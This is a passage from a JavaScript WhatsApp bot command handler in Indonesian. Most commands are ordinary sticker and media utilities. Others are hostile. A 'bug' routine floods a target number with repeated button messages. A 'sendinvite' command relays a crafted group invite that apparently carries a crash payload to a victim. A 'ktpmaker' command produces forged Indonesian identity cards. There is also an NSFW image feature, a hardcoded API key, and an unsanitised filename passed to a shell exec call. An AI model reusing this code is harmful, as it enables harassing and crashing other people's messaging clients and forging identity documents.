{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 await sleep(20)
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 m.reply('sukses send bug kepada target')
}
break
//=================================================//
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`,
"groupName": `MY NAME 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'sange': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

Ketik On Untuk Menyalakan Fitur Ini
Ketif Of Untuk Menon Aktifkan Fitur Ini

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(m.chat, anuala, `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${buttonkal}`,
} 
haikal.sendMessage(m.chat, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${buttonkal}`,
} 
haikal.sendMessage(m.chat, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'welcome': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return groupon(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Welcome Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nIkuti Aturan Admin Yang Berlku Yang Ada Di Deskripsi `, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome di group ini')
} else {
const komo = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
haikal.sendMessage(m.chat, komo)
}
}
break
case 'ktpmaker': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply(mess.wait)
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await haikal.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
//await sleep(5000)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
//=================================================//
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
//=================================================//
case 'toimage': case 'toimg': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'toaud': case 'toaudio': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
case 'tovn': case 'toptt': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'pinterest': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
case 'coffe': case 'kopi': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(m.chat, ko, { quoted:m })
}
break
case 'getname': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})

break
case 'play': case 'ytplay': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'mediafire': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!text) throw '*Link Nyq Coy*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait hwmods processing..._

*𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚*`
m.reply(`${result4}`)
